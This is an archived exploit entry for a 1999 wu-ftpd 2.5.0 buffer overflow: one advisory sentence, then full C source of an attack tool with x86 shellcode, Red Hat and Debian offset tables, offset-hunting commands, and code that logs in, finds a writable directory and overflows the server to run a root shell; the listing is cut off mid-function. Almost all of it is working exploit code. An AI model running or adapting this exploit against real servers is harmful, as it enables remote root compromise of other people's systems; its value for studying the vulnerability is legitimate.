@@ -1,0 +1,1397 @@
+source: http://www.securityfocus.com/bid/726/info
+
+There is a buffer overflow in wu-ftpd message file expansions which may be remotely exploitable. In situations where the message file can be written to in some way remotely by regular or anonymous users, this may result in a root compromise. This detailed in an AUSCERT advisory AA-1999.01. 
+
+---ifafoffuffoffaf.c---
+/*
+  <tmogg> ifaf ?
+  <typo_> integrated ftp attack facility
+  <ElCamTuf> ifafoffuffoffaf
+  <ElCamTuf> sounds much better
+
+Code by typo/teso '99. http://teso.scene.at/ - DO NOT USE, DO NOT DISTRO.
+_----------------------------------------------------------------------------_
+    Ok, so edi found a way to bruteforce.. we made bruteforcing test code,
+    but wuftpd is too boring to finetune it.. enjoy this sploit in the
+    meanwhile. Send me offsets (see below) to typo@scene.at.
+-____________________________________________________________________________-
+
+Contributors: 
+     Bulba of LaM3rZ (thanks for the shellcode and the example w.sh)
+     edi (found a way to only have to find 2(!) offsets, he is hardcore!)
+     lcamtuf (dziekuje tobie za ostatunia noc)
+     Grue (helped me thinking, and testing, rh5.2, rh5.1 offsets)
+     scut (minor include and style fixes)
+     smiler (asm bugfixing), stealth (hellkit rox)
+
+Greets: Lam3rZ, ADM, THC, beavuh, and most other people that know us.
+*/
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/utsname.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+#include <time.h>
+#include <getopt.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdarg.h>
+
+/* LaM3rZ shellcode */
+unsigned char lamerz[]=
+        "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"
+        "\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"
+        "\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\x01\xb0\x27\xcd"
+        "\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb"
+        "\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e"
+        "\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
+        "\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88"
+        "\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89"
+        "\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31"
+        "\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\x30\x62\x69\x6e"
+        "\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x6e\x67";
+
+/* teso code: write(1,"teso\n",5); exit(0); */
+unsigned char testcode[] = 
+    "\xeb\x1c\x31\xc0\x59\x31\xd2\x31\xdb\xb3\x01\xb2\x05\xb0"
+    "\x0b\xfe\xc8\x88\x41\x04\xb0\x04\xcd\x80\x30\xdb\xb0\x01"
+    "\xcd\x80\xe8\xdf\xff\xff\xfftesox";
+
+/* teso code: ioctl(, 0x5309, 0); */
+unsigned char cdcode[] =
+  "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x36\x5b\xff\x0b\xff\x4b\x04"
+  "\x4b\x80\x6b\x0b\x35\x43\x31\xc0\x31\xc9\x31\xd2\xb0\x05\x66\xb9\x04\x08"
+  "\x66\xba\x9a\x02\xcd\x80\x89\xc3\x31\xc0\x31\xc9\x31\xd2\xb0\x36\x66\xb9"
+  "\x09\x53\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xc5\xff\xff\xff"
+  "\x30\x64\x65\x76\x30\x63\x64\x72\x6f\x6d\x35";
+
+/* uh.. script kiddies suck. */
+char *shellcode = cdcode;
+
+typedef struct dir *dirptr;
+
+struct dir {
+        char    *name;
+        dirptr  next;
+} dirproto;
+
+void    title (void);
+void    usage (const char *me);
+void    connect_to_ftp (void);
+void    log_into_ftp (void);
+void    parseargs (int argc, char **argv);
+void    cleanup_and_exit (void);
+int     x2port (const char *smtn);
+void    err (int syserr, const char *msg, ...);
+int     cwd (const char *path);
+int     mkd (char *name);
+int     rmd (char *name);
+int     is_writable (void);
+void    getpwd (void);
+int     recurse_writable (void);
+void    *xmalloc (size_t size);
+void    *xcalloc (int factor, size_t len);
+char    *xstrdup (const char *s);
+ssize_t xread (int fd, void *buf, size_t count);
+ssize_t xwrite (int fd, const void *buf, size_t count);
+int     xbind (int sockfd, struct sockaddr *my_addr, int addrlen);
+int     xsocket (int domain, int type, int protocol);
+int     xsetsockopt (int s, int level, int optname, const void *optval,
+        unsigned int optlen);
+int     xconnect (int  sockfd,  struct sockaddr *serv_addr, int addrlen);
+void    sighandler (int signal);
+struct hostent  *xgethostbyname (const char *name);
+struct hostent  *xgethostbyaddr (const char *addr, int len, int type);
+void    putserv (const char *fmt, ...);
+char    *getline (void);
+char    *getmsg (const char *msg);
+int     wuftpd_250_sploitit (void);
+dirptr  newdir (char *name);
+char    *getdir (char *stat);
+char    *int2char (int addr);
+int     check_test_return();
+
+/*----------------------------------------------------------------
+***                     How to get offsets                     ***
+------------------------------------------------------------------
+Edis elite way of getting offsets:
+
+objdump --disassemble in.ftpd | egrep -6 "3c 2e|0f bf 43 06" |
+grep "\$0x80" | awk '{print $8}'
+------------------------------------------------------------------
+My lame way of getting offsets:
+(as many people have asked: search for ltrace at http://freshmeat.net/)
+
+tty1:
+nc 0 21
+USER someuser
+PASS hispass
+tty2:
+ltrace -S -p pid_of_ftpd 2>&1 | egrep "SYS_chdir|longjmp"
+tty1:
+CWD /not/current/dir
+MOO
+QUIT
+tty2:
+first argument of first SYS_chdir is mapped_path offset.
+first argument of longjmp is errcatch offset
+------------------------------------------------------------------
+try 4096 and/or 1024 for maxpathlen (works 99% of the time).
+------------------------------------------------------------------*/
+
+struct sploitdata {
+        char            *banner;
+        char            *desc;
+        char            pad_eax;
+        unsigned int    maxpathlen;
+        unsigned int    mapped_path;
+        unsigned int    errcatch;
+        int             (*code)();
+        int             need_writable;
+};
+
+#define START_MAPPED 0x08060000
+
+struct sploitdata spdata[] = {
+        {
+            "FTP server (Version wu-2.5.0(1) Tue Jun 8 08:55:12 EDT 1999)",
+            "rh6 - wu-ftpd-2.5.0-2.i386.rpm",
+            0,
+            4096,
+            0x0806a1e0,
+            0x08077fc0,
+            wuftpd_250_sploitit,
+            1,
+        },
+        {
+            "Fri May 21 10:45:57 EDT 1999",
+            "rh5.1 - wu-ftpd-2.5.0-1.RH5-1.i386.rpm",
+            0,
+            1024,
+            0x08066890,
+            0x0806fcc0,
+            wuftpd_250_sploitit,
+            1,
+        },
+        {
+            "Tue Jun 8 11:19:44 EDT 1999",
+            "rh5.2 - wu-ftpd-2.5.0-0.5.2.i386.rpm",
+            0,
+            1024,
+            0x08067504,
+            0x08077fc0,
+            wuftpd_250_sploitit,
+            1,
+        },
+        {
+            "FTP server (Version wu-2.5.0(1) Sat Sep 11 01:19:26 CEST 1999)",
+            "debian 2.1 - standard source compilation",
+            0,
+            1024,
+            0x806928c,
+            0x8071a80,
+            wuftpd_250_sploitit,
+            1,
+        },
+        {
+            "FTP server (Version wu-2.5.0(1)",
+            "rh6.0 wu-ftpd-2.5.0.tar.gz - standard source compilation",
+            0,
+            4096,
+            0x8068f80,
+            0x8076d60,
+            wuftpd_250_sploitit,
+            1,
+        },
+        {
+            NULL,
+            NULL,
+            0,
+            0,
+            0,
+            0,
+            NULL,
+            0,
+        }
+};
+
+struct sploitdata *sptr = spdata;
+
+int     debug = 0,
+        disp = 1,
+        fd = 0,
+        nostat = 1,
+        offset_selected = 0;
+
+struct tesopt {
+        char                    *user;
+        char                    *host;
+        char                    *pass;
+        char                    *cwd;
+        char                    *rev;
+        char                    *dirname;
+        int                     dirlen;
+        char                    testonly;
+        char                    dirscanonly;
+        unsigned short int      sport;
+        unsigned short int      port;
+        struct hostent          *he;
+} tesopt;
+
+struct hostinf {
+        char    *header;
+        char    *pwd;
+        char    *writable_dir;
+        int     pwdlen;
+} hostinf;
+
+#define COLOR
+
+#ifdef COLOR
+#define C_NORM "\E[0m"
+#define C_BOLD "\E[1m"
+#define C_GREEN "\E[32m"
+#define C_RED "\E[31m"
+#define C_BROWN "\E[33m"
+#define C_BLUE "\E[34m"
+#define C_PINK "\E[35m"
+#define C_CYAN "\E[36m"
+#define C_YELL  "\E[33m"
+#else
+#define C_NORM ""
+#define C_BOLD ""
+#define C_GREEN ""
+#define C_RED ""
+#define C_BROWN ""
+#define C_BLUE ""
+#define C_PINK ""
+#define C_CYAN ""
+#define C_YELL  ""
+#endif
+
+/* title
+ *
+ * print title
+ *
+ * no return value
+ */
+void
+title (void)
+{
+        printf (C_BOLD"---"C_GREEN"teso"C_NORM C_GREEN"ftpd"C_NORM C_BOLD"---"
+                C_NORM"\n");
+        return;
+}
+
+/* newdir
+ *
+ * return a pointer to a new dir with name name
+ *
+ * pointer to dir structure
+ */
+dirptr
+newdir (char *name)
+{
+    dirptr      tmp;
+
+    tmp = (dirptr) xmalloc (sizeof (dirproto));
+    tmp->name = xstrdup (name);
+    tmp->next = NULL;
+
+    return (tmp);
+}
+
+/* usage
+ *
+ * print usage
+ *
+ * no return value
+ */
+void
+usage (const char *me)
+{
+    struct sploitdata   *cow;
+    int                 i = 0;
+    
+/*    printf ("usage: %s\n\n", me); */
+    printf ("-h              - this help\n"
+    "-s <server>     - specify server\n"
+    "-p <port>       - destination port\n"
+    "-f <sourceport> - source port\n"
+    "-v(v)           - increase verboseness, use twice for full verboseness\n"
+    "-u <user>       - user name to use for login\n"
+    "-P <pass>       - password to use for login\n"
+    "-c <startdir>   - directory to cwd to after login\n"
+    "-d <writedir>   - directory to test writeability with\n"
+    "-r <revhost>    - revlookup this host sees you with\n"
+    "-D <dirlen>     - specifies the directory length\n"
+    "-T              - use test shellcode (prints success, spawns no shell)\n"
+    "-t <type>:\n");
+
+    for (cow = spdata ; cow->desc ; ++cow) {
+        printf ("%s-%s %3d %s%s-%s\n%s\n%s\n", C_BOLD, C_GREEN, i++, C_NORM,
+        C_BOLD, C_NORM, cow->banner, cow->desc);
+    }
+    printf ("%s-%s EOO %s%s-%s\n", C_BOLD, C_GREEN, C_NORM, C_BOLD, C_NORM);
+
+    exit (EXIT_FAILURE);
+}
+
+/* sighandler
+ *
+ * handle signals
+ *
+ * no return value
+ */
+void
+sighandler (const int signal)
+{
+        printf ("received signal: %d... exiting!\n", signal);
+        cleanup_and_exit ();
+}
+
+/* err
+ *
+ * print an error message. if arg0 is set add an errno message (perror like)
+ * exit afterwards
+ *
+ * no return value
+ */
+void
+err (const int syserr, const char *msg, ...)
+{
+        va_list ap;
+
+        printf ("%serr:%s ", C_RED, C_NORM); 
+
+        va_start (ap, msg);
+        vprintf (msg, ap);
+        va_end (ap);
+
+        if (syserr) {
+                printf (": %s\n", sys_errlist[errno]);
+        } else {
+                printf ("\n");
+        }
+
+        cleanup_and_exit();
+
+        return;
+}
+
+/* parseargs
+ *
+ * parse arguments
+ *
+ * no return value (exit on failure)
+ */
+void
+parseargs (int argc, char **argv)
+{
+        char    c;
+
+        opterr = 0;
+        tesopt.user = "anonymous";
+        tesopt.pass = "m@y.kr";
+        tesopt.dirname = "tesotest";
+        tesopt.port = 21;
+        tesopt.sport = 666;
+        tesopt.cwd = "";
+        tesopt.dirlen = 255;
+        tesopt.testonly = 0;
+        tesopt.dirscanonly = 0;
+
+        while ((c = getopt (argc, argv, "vhs:p:f:u:P:c:d:D:r:t:bTo")) != EOF) {
+                switch (c) {
+                case 'v':       ++debug;
+                                break;
+                case 'h':       usage (argv[0]);
+                                break;
+                case 's':       tesopt.host = optarg;
+                                break;
+                case 'p':       if (optarg != NULL)
+                                        tesopt.port = x2port (optarg);
+                                break;
+                case 'f':       if (optarg != NULL)
+                                        tesopt.sport = x2port (optarg);
+                                break;
+                case 'u':       if (optarg != NULL)
+                                        tesopt.user = optarg;
+                                break;
+                case 'P':       if (optarg != NULL)
+                                        tesopt.pass = optarg;
+                                break;
+                case 'c':       if (optarg != NULL)
+                                        tesopt.cwd = optarg;
+                                break;
+                case 'd':       if (optarg != NULL)
+                                        tesopt.dirname = optarg;
+                                break;
+                case 'r':       if (optarg != NULL)
+                                        tesopt.rev = xstrdup (optarg);
+                                break;
+                case 'D':       tesopt.dirlen = atoi(optarg);
+                                break;
+                case 't':       sptr += atoi(optarg);
+                                offset_selected = 1;
+                                if (!sptr->desc) {
+                                        err (0, "invalid offset set");
+                                }
+                                break;
+
+                case 'T':       shellcode = testcode;
+                                tesopt.testonly = 1; break;
+                case 'o':       tesopt.dirscanonly = 1; break;
+
+                }
+        }
+
+        if (tesopt.host == NULL)
+                err (0, "server not specified (see -h)");
+        if (tesopt.port == 0)
+                err (0, "port not or incorrectly specified (see -h)");
+        if (tesopt.sport == 0)
+                err (0, "sport not or incorrectly specified (see -h)");
+
+        if (tesopt.dirlen == 0)
+                err (0, "illegal dirlen!\n");
+
+        tesopt.he = xgethostbyname (tesopt.host);
+
+        return;
+}
+
+struct hostent *
+xgethostbyname (const char *name)
+{
+        struct hostent  *tmp;
+
+        tmp = gethostbyname (name);
+        if (tmp == NULL)
+                err (1, "cannot gethostbyname");
+
+        return (tmp);
+}
+
+struct hostent *
+xgethostbyaddr (const char *addr, int len, int type)
+{
+        struct hostent  *tmp;
+
+        tmp = gethostbyaddr (addr, len, type);
+        if (tmp == NULL)
+                err(1,"cannot gethostbyaddr");
+
+        return (tmp);
+}
+
+/* xmalloc
+ *
+ * wrap malloc with error handling
+ *
+ * return or abort
+ */
+void *
+xmalloc (size_t size)
+{
+        void    *tmp = malloc (size);
+
+        if (tmp == NULL)
+                err (1, "malloc failed");
+
+        return (tmp);
+}
+
+/* xcalloc
+ *
+ * wrap calloc with error handling
+ *
+ * return or abort
+ */
+void *
+xcalloc (int factor, size_t len)
+{
+        void    *new = calloc (factor, len);
+
+        if (new == NULL)
+                err (1, "calloc failed");
+
+        return (new);
+}
+
+/* xstrdup
+ *
+ * wrap strdup with error handling
+ *
+ * return or abort
+ */
+char *
+xstrdup (const char *s)
+{
+        char    *tmp;
+
+        tmp = strdup (s);
+        if (tmp == NULL)
+                err (1, "strdup failed");
+
+        return (tmp);
+}
+
+/* xread
+ *
+ * read with error handling
+ *
+ * return length of readen data
+ */
+ssize_t
+xread (int fd, void *buf, size_t count)
+{
+        int     tmp;
+
+        tmp = read (fd, buf, count);
+        if (tmp < 1)
+                err (1, "read failed");
+
+        return (tmp);
+}
+
+/* xwrite
+ *
+ * write with error handling
+ *
+ * return length of written data
+ */
+ssize_t
+xwrite (int fd, const void *buf, size_t count)
+{
+        int     tmp;
+
+        tmp = write (fd, buf, count);
+        if (tmp < 0)
+                err (1, "write failed");
+
+        return (tmp);
+}
+
+/* xbind
+ *
+ * bind with error handling
+ *
+ * return bound socket
+ */
+int
+xbind (int sockfd, struct sockaddr *my_addr, int addrlen)
+{
+        int     tmp;
+
+        tmp = bind (sockfd, (struct sockaddr *) my_addr, addrlen);
+        if (tmp < 0)
+                err (1, "bind failed");
+
+        return (tmp);
+}
+
+/* xsocket
+ *
+ * socket with error handling
+ *
+ * return allocated socket descriptor
+ */
+int
+xsocket (int domain, int type, int protocol)
+{
+        int     tmp;
+
+        tmp = socket (domain, type, protocol);
+        if (tmp < 0)
+                err (1, "socket failed");
+
+        return (tmp);
+}
+
+/* xsetsockopt
+ *
+ * setsockopt with error handling
+ */
+int
+xsetsockopt (int s, int level, int optname, const void *optval,
+        unsigned int optlen)
+{
+        int     tmp;
+
+        tmp = setsockopt (s, level, optname, optval, optlen);
+        if (tmp < 0)
+                err (1, "setsockopt failed");
+
+        return (tmp);
+}
+
+/* xconnect
+ *
+ * connect with error handling
+ */
+int
+xconnect (int sockfd, struct sockaddr *serv_addr, int addrlen)
+{
+        int     tmp;
+
+        tmp = connect (sockfd, serv_addr, addrlen);
+        if (tmp < 0)
+                err (1, "connect failed");
+
+        return (tmp);
+}
+
+
+/* connect_to_ftp
+ *
+ * connect to ftpserver and resolve local ip
+ *
+ * return nothing
+ */
+void
+connect_to_ftp (void)
+{
+    int                 i = 1;
+    struct sockaddr_in  sin;
+    struct hostent              *he;
+    
+    
+    fd = xsocket (AF_INET, SOCK_STREAM, 0);
+    xsetsockopt (fd, SOL_SOCKET, SO_REUSEADDR, &i, sizeof (i));
+    
+    bzero (&sin, sizeof (sin));
+    
+    sin.sin_family = AF_INET;
+//    sin.sin_port = htons (tesopt.sport);
+    sin.sin_addr.s_addr = 0;
+    
+   xbind (fd, (struct sockaddr*) &sin, sizeof (sin));
+    
+    sin.sin_port = htons (tesopt.port);
+    sin.sin_family = AF_INET;
+
+    memcpy (&sin.sin_addr.s_addr, tesopt.he->h_addr, sizeof (struct in_addr));
+
+    xconnect (fd, (struct sockaddr*) &sin, sizeof (sin));
+
+    /* this is a good time to get our revlookup (if not user defined) */
+    if (tesopt.rev == NULL) {
+        i = sizeof (sin);
+        getsockname (fd, (struct sockaddr *) &sin, &i);
+        he = gethostbyaddr ((char *) &sin.sin_addr, 
+                            sizeof (sin.sin_addr), AF_INET);
+        tesopt.rev = xstrdup (he->h_name);
+    }
+    printf ("Connected! revlookup is: %s, logging in...\n", tesopt.rev);
+
+    return;
+}
+
+/* putserv
+ *
+ * send data to the server
+ */
+void
+putserv (const char *fmt, ...)
+{
+        va_list         ap;
+        unsigned char   output[1024];
+        int             i, total;
+
+        memset (output, '\0', sizeof (output));
+        va_start (ap, fmt);
+        vsnprintf (output, sizeof (output) - 1, fmt, ap);
+        va_end (ap);
+
+        /* this is edis code
+         */
+        total = strlen (output);
+        for (i = 0; i < total; i++) {
+                if (output[i] == 0xff) {
+                        memmove (output + i + 1, output + i, total - i);
+                        total++;
+                        i++;
+                }
+        }
+
+        if (disp != 0 && (debug > 1))
+                printf ("%s%s%s", C_BLUE, output, C_NORM);
+
+        xwrite (fd, output, total);
+
+        return;
+}
+
+#define LINEBUFLEN 8192
+char    linebuf[LINEBUFLEN];  /* saves us free()ing trouble. */
+
+/* getline
+ *
+ * get next line from server or local buffer
+ */
+char *
+getline (void)
+{
+        char    y[2];
+        int     i = 0;
+
+        memset (linebuf, '\0', sizeof (linebuf));
+        strcpy (y, "x");
+
+        while (strncmp (y, "\n", 1) != 0) {
+                if (i > (sizeof (linebuf) + 2)) {
+                        err (0, "getline() buffer full");
+                }
+                i += xread (fd, y, 1);
+                strcat (linebuf, y);
+        }
+
+        if (disp != 0 && debug > 0) {
+#ifdef COLOR
+                if (nostat != 0) {
+                        char    color[64];
+
+                        memset (color, '\0', sizeof (color));
+
+                        switch (linebuf[0]) {
+                        case '2':       strcpy (color, C_CYAN);
+                                        break;
+                        case '3':       strcpy (color, C_BROWN);
+                                        break;
+                        case '4':       strcpy (color, C_RED);
+                                        break;
+                        case '5':       strcpy (color, C_RED);
+                                        break;
+                        default:        break;
+                        }
+
+                        printf ("%s", color);
+                }
+#endif
+                if (nostat != 0 || debug > 1)
+                        printf ("%s", linebuf);
+#ifdef COLOR
+                if (nostat != 0)
+                        printf ("%s", C_NORM);
+#endif
+        }
+
+        return (linebuf);
+}
+
+/* getmsg
+ *
+ * discard lines until expected response or error is reported
+ */
+char *
+getmsg (const char *msg)
+{
+        char    *line;
+        int     i = strlen (msg);
+
+        do {
+                line = getline ();
+        } while (strncmp (line, msg, i) != 0 && strncmp (line, "5", 1) != 0);
+
+        return (line);
+}
+
+/* log_into_ftp
+ *
+ * log into the ftp server given the login name and password
+ *
+ * return nothing
+ */
+void
+log_into_ftp (void)
+{
+        char    *line;
+        char    foundmatch=0;
+
+        line = getmsg ("220 ");
+        hostinf.header = xstrdup (line);
+
+        if (!debug)
+            printf("%s", line);
+        if (!offset_selected) {
+            for (sptr = spdata ; sptr->banner ; ++sptr) {
+                if (strstr(line, sptr->banner)) {
+                    foundmatch=1;
+                    break;
+                }
+            }
+            if (!foundmatch)
+                err(0, "No offset selected, and no matching banner found!");
+        }
+
+        printf ("Using offsets from: %s\n", sptr->desc);
+
+        putserv ("USER %s\n", tesopt.user);
+        getmsg ("331 ");
+        putserv ("PASS %s\n", tesopt.pass);
+        line = getmsg ("230 ");
+        if (strncmp ("5", line, 1) == 0)
+                err (0, "login not accepted!\n");
+
+        if (strlen (tesopt.cwd) > 0) {
+                if (cwd (tesopt.cwd) == 0) { 
+                        err (0, "initial CWD failed.");
+                }
+        }
+
+        getpwd ();
+
+        return;
+}
+
+/* recurse_writable
+ *
+ * recursively scans for writable dirs, starting in CWD
+ *
+ * return 1 for CWD is writable
+ * return 0 for no writable dir found
+ */
+int
+recurse_writable (void)
+{
+        dirptr  dirroot = NULL,
+                current = NULL,
+                prev = NULL;
+        char    *line = "",
+                *tmp = "";
+
+        if (is_writable () != 0)
+                return (1);
+
+        nostat = 0; 
+        putserv ("STAT .\n");
+
+        while (strncmp (line, "213 ", 4) != 0) {
+                line = getline ();
+                tmp = getdir (line);
+
+                if (tmp == NULL)
+                        continue;
+                if (dirroot == NULL) {
+                        current = dirroot = newdir (tmp);
+                        continue;
+                }
+
+                current->next = newdir (tmp);
+                current = current->next;
+        }
+
+        nostat = 1; 
+        current = dirroot;
+
+        while (current != NULL) {
+                if (cwd (current->name)) {
+                        if (recurse_writable ())
+                                return (1);
+                        cwd ("..");
+                }
+
+                prev = current;
+                current = current->next;
+                free (prev->name);
+                free (prev);
+        }
+
+        return (0);
+}
+
+/* mkd
+ *
+ * make a directory
+ *
+ * return 0 on success
+ * return 1 if the directory already exists
+ * retrun 2 on error
+ */
+int
+mkd (char *name)
+{
+        char    *line;
+
+        putserv ("MKD %s\n", name);
+        line = getmsg ("257 ");
+
+        if (strncmp ("521 ", line, 4) == 0)
+                return (1);
+
+        if (strncmp ("257 ", line, 4) == 0)
+                return (0);
+
+        return (2);
+}
+
+
+/* rmd
+ *
+ * remove a directory
+ *
+ * return 0 on success
+ * return 1 on failure
+ */
+int
+rmd (char *name)
+{
+        char    *line;
+
+        putserv ("RMD %s\n", name);
+        line = getmsg ("250 ");
+
+        if (strncmp("250 ", line, 4) == 0)
+                return (0);
+
+        return (1);
+}
+
+/* is_writeable
+ *
+ * check whether the current working directory is writeable
+ *
+ * return 1 if it is
+ * return 0 if it is not
+ */
+int
+is_writable (void)
+{
+        int     i = 0,
+                is = 0;
+
+redo:
+        if (++i > 3)
+                return (0);
+
+        is = mkd (tesopt.dirname);
+        if (is == 1) {
+                printf ("leet.. our file already exists.. delete and retry\n");
+                rmd (tesopt.dirname);
+
+                goto redo;
+        } else if (is == 0) {
+                rmd (tesopt.dirname);
+
+                return (1);
+        }
+
+        return (0);
+}
+
+/* cwd
+ *
+ * change current working directory on the ftp server
+ *
+ * return 1 on success
+ * return 0 on failure
+ */
+int
+cwd (const char *path)
+{
+        char    *line;
+
+        if (debug != 0)
+                printf ("CWD %s\n", path);
+
+        putserv ("CWD %s\n", path);
+        line = getmsg ("250 ");
+
+        if (strncmp ("250 ",line, 4) == 0)
+                return (1);
+
+        return (0);
+}
+
+/* getpwd
+ *
+ * sets hostinf.pwd to CWD
+ *
+ * returns nothing 
+ */
+void
+getpwd (void)
+{
+        char    *tmp,
+                *line;
+        char    *chr,
+                *rchr;
+
+        putserv ("PWD\n");
+        line = getmsg ("257 ");
+        if (strncmp ("257 ", line, 4) != 0)
+                err (0, "getpwd failed: incorrect answer: %s", line);
+
+        /* too long, but for sure long enough. */
+        tmp = xcalloc (strlen (line) + 1, 1);
+    
+        chr = strchr (line, '"');
+        rchr = strrchr (line, '"');
+
+        if (chr == NULL)
+                err (0, "no \"'s in getpwd.");
+
+        if (chr == rchr)
+                err (0, "only one \" in getpwd.");
+
+        if ((rchr - chr) < 2)
+                err (0, "pwd too short?");
+
+        strncat (tmp, chr + 1, rchr - chr - 1);
+
+        if (hostinf.pwd != NULL)
+                free (hostinf.pwd);
+
+        hostinf.pwd = xstrdup (tmp);
+        free (tmp);
+
+        hostinf.pwdlen = strlen (hostinf.pwd);
+/*    printf("current pwd is %s\n", hostinf.pwd); */
+}
+
+/* getdir
+ *
+ * get directory from a STAT string (parsing works with wuftpd AND proftpd)
+ *
+ * return pointer to directory name on success
+ * return NULL on failure/not a directory
+ */
+char *
+getdir (char *stat)
+{
+        char    *dir = stat;
+
+        if (strlen (dir) < 57)
+                return (NULL);
+
+        if (strncmp (" ", dir, 1) == 0)
+                ++dir;
+        if (strncmp ("d", dir, 1) != 0)
+                return (NULL);
+
+        dir += 55;
+        dir[strlen (dir) - 2] = 0;
+/*    printf("strlen is %d for %s",strlen(dir), dir); */
+
+        if (strcmp (".", dir) == 0 || strcmp ("..", dir) == 0)
+                return (NULL);
+
+        return (dir);
+}
+
+/* cleanup_and_exit
+ *
+ * cleanup functions on exit
+ *
+ * return nothing
+ */
+void
+cleanup_and_exit (void)
+{
+        free (tesopt.rev);
+        free (hostinf.header);
+        free (hostinf.pwd);
+        close (fd);
+
+        printf ("%s\n", C_NORM);
+
+        exit (EXIT_SUCCESS);
+}
+
+/* x2port
+ *
+ * like atoi, but with getservbyname if atoi() fails
+ *
+ * return port
+ */
+int
+x2port (const char *smtn)
+{
+        struct servent  *serv;
+        int             port;
+
+        port = atoi (smtn);
+        if (port == 0) {
+                serv = getservbyname (smtn, "tcp");
+                if (serv != NULL)
+                        port = htons (serv->s_port);
+        }
+
+        return (port);
+}
+
+/* int2char
+ *
+ * converts an integer to 4byte char *
+ *
+ * return port
+ */
+char    int2char_tmp[8];
+char *
+int2char (int addr)
+{
+        bzero(&int2char_tmp, 8);
+        int2char_tmp[0] = (addr & 0x000000ff);
+        int2char_tmp[1] = (addr & 0x0000ff00) >> 8;
+        int2char_tmp[2] = (addr & 0x00ff0000) >> 16;
+        int2char_tmp[3] = (addr & 0xff000000) >> 24;
+        int2char_tmp[4] = 0;
+
+        return (int2char_tmp);
+}
+
+/* wuftpd_250_sploitit
+ *
+ * tries to exploit wuftpd 2.5.0, after all preparation work is done.
+ *
+ * return 0 on error
+ * return 1 on success
+ */
+int
+wuftpd_250_sploitit (void)
+{
+    int shelloff,
+        times,
+        fill;
+    int start_writing_to_errcatch,
+        argvlen,
+        behind_errcatch;
+    int i, n;
+    char string[2048];
+
+    argvlen = strlen ("ftpd: ");
+    argvlen += strlen (tesopt.rev);
+    argvlen += strlen (": ");
+    argvlen += strlen (tesopt.user);
+    argvlen += strlen (": ");
+
+    if (strncmp ("anonymous", tesopt.user, 9) == 0)
+        argvlen += strlen (tesopt.pass) + 1;
+
+    times = (sptr->maxpathlen-hostinf.pwdlen) / (tesopt.dirlen + 1);
+
+    fill = sptr->maxpathlen-hostinf.pwdlen - (tesopt.dirlen + 1) * times;
+
+    if (debug > 0) {
+        printf ("CWD %d + (dirlen %d * %d times) + fill %d = %d\n", 
+                hostinf.pwdlen, tesopt.dirlen, times, fill, sptr->maxpathlen);
+    }
+
+    if (strlen (shellcode) > (tesopt.dirlen - 40))
+        err(0, "shellcode too big, edit the source to use less padding,"
+                "\nhmm.. this shouldn't have happened with LaM3rZ shellcode!");
+
+    /* let's try to hit the middle of our 0x90 pad */
+    shelloff = sptr->mapped_path + hostinf.pwdlen 
+                            + ( (tesopt.dirlen - strlen(shellcode)) / 2);
+
+    if (debug > 0)
+        printf ("will try to longjmp to 0x%x\n", shelloff);
+
+    start_writing_to_errcatch = sptr->errcatch - argvlen;
+    behind_errcatch = sptr->errcatch + (6 * 4) + 2 + 8;
+
+    if (debug > 0) {
+        printf ("errcatch(0x%x) - argvlen(%d) = start 0x%x - end 0x%x\n", 
+                sptr->errcatch, argvlen, start_writing_to_errcatch, behind_errcatch);
+    }
+
+    memset (string, 'A', tesopt.dirlen);
+
+    if (debug<3) /* 0x0e/^N in shellcode -> not meant for humans. */
+        disp = 0;
+    for (i = 0; i < times; i++) {
+            switch (i) {
+            case 0: memset (string, 0x90, tesopt.dirlen);
+                    memcpy (string+tesopt.dirlen-strlen(shellcode), 
+                            shellcode, strlen (shellcode)); 
+                    break;
+            case 1: memset (string, 0x90, tesopt.dirlen); break;
+            default:
+                    break;
+            }
+
+            string[tesopt.dirlen] = 0;
+            putserv ("MKD %s\n", string);
+            getline ();
+
+            putserv ("CWD %s\n", string);
+            getline ();
+    }
+
+    getpwd ();
+    disp = 1;
+
+    if (debug > 0)
+        printf ("Now %d bytes deep in dir structure.\n", hostinf.pwdlen);
+
+    if (fill != sptr->maxpathlen-hostinf.pwdlen)
+        err (0, "Calculation wrong. Error!");
+
+    if (fill > 506)
+        err (0, "Aw.. fuck! My fill is waaaay to big!\n");
+
+    /* onefile[0], onefile[1] and maybe pad_eax */
+    fill += sptr->pad_eax ? 12 : 8;
+
+    n = fill/4;
+    string[0] = 0;
+    for (i=0; i < n; i++)
+        strcat(string, int2char(start_writing_to_errcatch));
+    for (i=1; i < (fill - (n*4)); i++)
+        strcat(string, "A");
+
+    /* mapped_path + currentpwdlen + / + 3*4 -> should be pointer to errcatch */
+    strcat (string, int2char (sptr->mapped_path+hostinf.pwdlen+13)); /* Argv */
+    strcat (string, int2char (behind_errcatch)); /* LastArgv */
+
+    if (debug > 0)
+            printf ("Sending final CWD\n");
+
+    if (strlen (string) < 20)
+    err (0, "cwd string too short.. check for 0x0's.\n");
+
+    putserv ("CWD %s\n", string);
+    getline ();
+
+/************ jmpbuf ***********/
+
+    if (debug > 0)
+            printf ("Sending jmpbuf\n");
+
+    string[0] = 0;
+    for (i=0; i<8; i++) /* (sizeof(jmpbuf) = 24)+8.. */
+        strcat (string, int2char (shelloff));
+
+    if (strlen (string) != 32)
